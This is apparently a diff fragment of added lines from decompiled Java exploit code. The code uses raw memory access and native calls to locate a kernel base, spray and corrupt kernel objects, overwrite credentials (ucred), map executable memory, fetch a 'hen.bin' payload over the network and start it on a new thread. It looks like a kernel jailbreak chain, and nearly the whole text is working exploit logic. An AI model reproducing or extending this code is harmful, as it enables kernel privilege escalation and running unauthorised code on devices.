+ 1232  l141 = Hx1400.sx(this.ac(unsafe, l42, l140, l2, string2.length(), 0L, 0L, 0L));
+ 1236  l2 = Hx1400.sx(this.ac(unsafe, l43, l3, 0L, 0L, 0L, 0L, 0L));
+ 1241  l142 = Hx1400.sx(this.ac(unsafe, l15, l2, l, 256L, 0L, 0L, 0L));
+ 1261  long l145 = l122 != 0L ? Hx1400.sx(this.ac(unsafe, l122, 0L, 0L, 0L, 0L, 0L, 0L)) : -1L;
+ 1265  if (nArray7[i] <= 0 || Hx1400.sx(this.ac(unsafe, l44, nArray7[i], 0L, 0L, 0L, 0L, 0L)) != 0L) continue;
+ 1274  long l147 = Hx1400.sx(this.ac(unsafe, l43, l146, 0L, 0L, 0L, 0L, 0L));
+ 1280  long l148 = Hx1400.sx(this.ac(unsafe, l60, 0L, 589824L, 7L, 0L, 0L, 0L));
+ 1292  this.lg(unsafe, "H3 hen map=" + Hx1400.hz(l149) + " span=" + Hx1400.hz(589824L) + " fd=" + l148);
+ 1299  string4 = HEN_URL;
+ 1303  while (l150 < (long)HEN_SIZE) {
+ 1325  this.lg(unsafe, "H4 fetched " + l150 + "/" + HEN_SIZE + " B via " + (HENURL == null ? "lan" : "session") + " err=" + string3);
+ 1326  if (l150 != (long)HEN_SIZE) {
+ 1327  return this.fin(unsafe, "hen.bin is " + l150 + " B, expected " + HEN_SIZE);
+ 1337  for (long i = (long)HEN_SIZE; i < 589824L; i += 8L) {
+ 1341  this.lg(unsafe, "H5 head=" + Integer.toHexString(n52) + " entry=0x" + Integer.toHexString(n56) + " (want 0x" + Integer.toHexString(HEN_ENTRY) + ") bssNonZero=" + n57);
+ 1342  boolean bl13 = bl = n52 == 233 && n56 == HEN_ENTRY && n57 == 0;
+ 1374  this.lg(unsafe, "H6 pthread_create=" + Hx1400.hz(l151) + " prologue=" + Integer.toHexString(n2));
+ 1384  l153 = Hx1400.sx(this.ac(unsafe, l151, l152, 0L, l149, 0L, 0L, 0L));
+ 1385  this.lg(unsafe, "H7 pthread_create rc=" + l153 + " handle=" + Hx1400.h16(unsafe.getLong(l152)));
+ 1395  if (Hx1400.sx(this.ac(unsafe, l44, nArray4[n], 0L, 0L, 0L, 0L, 0L)) != 0L) continue;
+ 1401  if (Hx1400.sx(this.ac(unsafe, l44, n26, 0L, 0L, 0L, 0L, 0L)) == 0L) {
+ 1407  if (Hx1400.sx(this.ac(unsafe, l44, l101, 0L, 0L, 0L, 0L, 0L)) == 0L) {
+ 1413  if (Hx1400.sx(this.ac(unsafe, l44, l8, 0L, 0L, 0L, 0L, 0L)) == 0L) {
+ 1420  if (Hx1400.sx(this.ac(unsafe, l44, nArray6[n], 0L, 0L, 0L, 0L, 0L)) != 0L) continue;
+ 1431  this.lg(unsafe, "H8 kept: hen map " + Hx1400.hz(l149) + " fd " + l148 + ", blob map, fake page " + Hx1400.hz(l107) + " - hen.bin runs from one of them");
+ 1442  this.lg(unsafe, "G kbase=" + Hx1400.h16(this.kbase) + " slot=" + Hx1400.h16(l116) + " ops=" + Hx1400.h16(l117));
+ 1444  stringBuffer8.append("HEN14V pid=").append(this.pid).append(" KBASE=").append(Hx1400.h16(this.kbase));
+ 1447  stringBuffer8.append(" KVA=").append(Hx1400.h16(l109)).append(" victim=").append(n10);
+ 1448  stringBuffer8.append(" bridge=").append(n41).append(" walked=").append(n6).append(" APPLIED=").append(n5 != 0 ? "1" : "0").append(" se11=").append(Hx1400.h16(l143));
+ 1592  n = this.w8(unsafe, l, n, this.ka(R_UCRED));
+ 1619  this.lg(unsafe, string + "1 fake pinned: ref=0x" + Integer.toHexString(unsafe.getInt(this.cFake + 56L)) + " srcs=" + Hx1400.h16(unsafe.getLong(this.cFake + 80L)) + " nsrc=" + unsafe.getLong(this.cFake + 88L));
+ 1643  long l = Hx1400.sx(this.ac(unsafe, this.cSke, this.cRkq, this.cEvB, 1L, 0L, 0L, 0L));
+ 1644  long l2 = Hx1400.sx(this.ac(unsafe, this.cCl, this.cRkq, 0L, 0L, 0L, 0L, 0L));
+ 1649  boolean bl3 = this.cCs != 0L && this.cMsav != 0L && Hx1400.sx(this.ac(unsafe, this.cCs, 3L, 1L, -1L, 16L, this.cMsav, 0L)) == 0L;
+ 1650  this.lg(unsafe, string + "4 QUARANTINED LIVE on purpose: " + this.cNv + " victims + " + this.cN + " spray + anchor/dce stay open, page " + Hx1400.hz(this.cPage) + " stays mapped ; unpinned=" + bl3);
+ 1737  long l10 = Hx1400.sx(this.ac(unsafe, l, 4097L, l5, 5L, 3L, l6, 0L));
+ 1781  return "op=" + this.wFailOp + " at=" + this.wFailAt + (this.wRc != 0L ? " rc=" + this.wRc : "") + (this.wBad != 0 ? " res=" + Hx1400.hz((long)this.wBad & 0xFFFFFFFFL) : "");
+ 1823  if (Hx1400.sx(this.ac(unsafe, l, n, 41L, 51L, l2, l3, 0L)) != 0L) {
